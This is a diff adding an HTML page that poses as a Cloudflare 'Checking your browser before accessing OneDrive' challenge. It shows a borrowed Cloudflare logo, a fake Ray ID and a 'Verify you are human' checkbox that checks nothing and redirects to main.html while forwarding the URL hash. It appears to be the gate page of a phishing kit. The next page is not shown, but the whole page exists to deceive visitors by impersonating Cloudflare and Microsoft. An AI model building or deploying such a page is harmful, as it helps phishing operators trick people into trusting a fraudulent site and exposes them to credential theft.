@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Just a moment...</title>
+  <style>
+    /* [STYLES UNCHANGED] */
+    body {
+      background-color: #1d1d1d;
+      color: white;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 880px;
+      padding: 80px 20px;
+      margin-left: 10%;
+    }
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    p.subtext, #security-msg {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 30px;
+      transition: all 0.3s ease;
+    }
+    .connection-check-msg {
+      font-size: 16px;
+      color: #ccc;
+      margin-top: -10px;
+      margin-bottom: 30px;
+    }
+    .box {
+      background-color: #000;
+      border: 1px solid #444;
+      padding: 12px 18px;
+      width: 300px;
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+    }
+    input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #0099ff;
+      cursor: pointer;
+    }
+    .cf-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      line-height: 1.1;
+      gap: 2px;
+      margin-left: auto;
+    }
+    .cf-logo img {
+      height: 68px;
+      display: block;
+      margin: 0;
+      padding: 0;
+      line-height: 1;
+    }
+    .cf-terms {
+      font-size: 10px;
+      color: #999;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .cf-terms a {
+      color: #999;
+      text-decoration: underline;
+      margin: 0 2px;
+    }
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 11px;
+      color: #777;
+    }
+    .footer-line {
+      width: 100%;
+      max-width: 880px;
+      margin: 0 auto 10px auto;
+      border-top: 1px solid #666;
+    }
+    .spinner, .small-spinner {
+      border: 3px solid #444;
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      animation: spin 0.8s linear infinite;
+    }
+    .small-spinner {
+      width: 16px;
+      height: 16px;
+      margin-right: 5px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .hidden {
+      display: none;
+    }
+    .fade-in {
+      animation: fadeIn 1s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container fade-in">
+    <h1>Checking your browser before accessing OneDrive...</h1>
+    <p id="security-msg">Verifying you are human. This may take a few seconds...</p>
+
+    <div class="box" id="loading-box">
+      <div class="spinner" id="main-spinner"></div>
+      <div class="cf-logo hidden" id="cf-info">
+        <img src="https://i.ibb.co/WNvpzMW3/cloudflare-original-wordmark-8x.png" alt="Cloudflare Logo"/>
+        <div class="cf-terms">
+          <a href="#">Privacy</a> • <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="box hidden" id="checkbox-box">
+      <label class="checkbox-label" id="checkbox-label">
+        <input type="checkbox" id="verify-checkbox"/>
+        <span id="checkbox-text">Verify you are human</span>
+      </label>
+      <div class="cf-logo">
+        <img src="https://i.ibb.co/WNvpzMW3/cloudflare-original-wordmark-8x.png" alt="Cloudflare Logo"/>
+        <div class="cf-terms">
+          <a href="#">Privacy</a> • <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
+
+    <p class="connection-check-msg" id="connection-msg">
+      OneDrive needs to review the security of your connection before proceeding.
+    </p>
+  </div>
+
+  <div class="footer">
+    <div class="footer-line"></div>
+    Ray ID: 93c1b6ce5ee425d8<br/>
+    Performance & security by Cloudflare
+  </div>
+
+  <script>
+    // Hash-aware redirect logic (merged)
+    const hash = window.location.hash;
+    if (hash) {
+      const target = 'main.html' + hash;
+      window.history.replaceState(null, '', ''); // Remove hash to prevent redirect loop
+    }
+
+    // UI flow logic
+    const loadingBox = document.getElementById("loading-box");
+    const checkboxBox = document.getElementById("checkbox-box");
+    const cfInfo = document.getElementById("cf-info");
+    const spinner = document.getElementById("main-spinner");
+    const securityMsg = document.getElementById("security-msg");
+    const checkbox = document.getElementById("verify-checkbox");
+    const checkboxLabel = document.getElementById("checkbox-label");
+
+    const statusUpdates = [
+      "Checking browser before accessing...",
+      "Performing security check...",
+      "Validating connection integrity...",
+      "Verifying you are human. This may take a few seconds..."
+    ];
+
+    statusUpdates.forEach((msg, index) => {
+      setTimeout(() => {
+        securityMsg.textContent = msg;
+      }, index * 1200);
+    });
+
+    setTimeout(() => {
+      spinner.classList.add("hidden");
+      cfInfo.classList.remove("hidden");
+    }, 1200);
+
+    setTimeout(() => {
+      loadingBox.classList.add("hidden");
+      checkboxBox.classList.remove("hidden");
+    }, 1200);
+
+    checkbox.addEventListener("change", () => {
+      if (checkbox.checked) {
+        checkboxLabel.innerHTML = '<div class="small-spinner"></div><span>Verifying...</span>';
+        securityMsg.textContent = "Verifying you are human. This may take a few seconds...";
+        setTimeout(() => checkboxBox.classList.add("hidden"), 1200);
+        setTimeout(() => {
+          window.location.href = 'main.html' + (hash || '');
+        }, 2000);
+      }
+    });
+  </script>
+</body>
+</html>
